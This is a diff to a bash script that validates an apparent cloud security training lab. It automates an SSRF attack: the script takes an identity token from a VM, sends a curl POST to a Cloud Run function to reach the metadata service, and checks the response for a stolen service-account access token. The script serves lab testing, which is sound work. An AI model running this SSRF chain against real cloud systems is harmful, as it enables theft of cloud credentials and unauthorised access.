@@ -4,8 +4,6 @@
 # This script validates the infrastructure setup and exploit path for Module 3
 # Must be run from local environment with gcloud access to the project
 
-set -euo pipefail
-
 # Color codes for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -309,8 +307,18 @@ FUNCTION_URL=$(gcloud run services describe monitoring-function \
 print_info "Using function URL: $FUNCTION_URL"
 
 # Execute the SSRF attack from VM
+# First get the identity token
+print_info "Getting identity token from VM..."
+ID_TOKEN=$(exec_on_vm "gcloud auth print-identity-token" || true)
+
+if [ -z "$ID_TOKEN" ]; then
+    print_fail "Failed to get identity token from VM"
+    exit 1
+fi
+
+# Then use it in the curl command
 SSRF_CMD="curl -s -X POST '$FUNCTION_URL' \
--H 'Authorization: Bearer \$(gcloud auth print-identity-token)' \
+-H 'Authorization: Bearer $ID_TOKEN' \
 -H 'Content-Type: application/json' \
 -d '{\"metadata\": \"token\"}'"
 
@@ -363,7 +371,14 @@ if echo "$SSRF_RESPONSE" | grep -q "access_token"; then
     fi
 else
     print_fail "Could not extract access token via SSRF"
-    print_info "Response preview: $(echo "$SSRF_RESPONSE" | head -c 100)..."
+    print_info "Response preview: $(echo "$SSRF_RESPONSE" | head -c 200)..."
+    
+    # Additional debugging
+    if echo "$SSRF_RESPONSE" | grep -q "401 Unauthor"; then
+        print_info "Got 401 Unauthorized - check that VM service account has run.invoker role"
+    elif echo "$SSRF_RESPONSE" | grep -q "404"; then
+        print_info "Got 404 - check function URL is correct"
+    fi
 fi
 
 # Summary
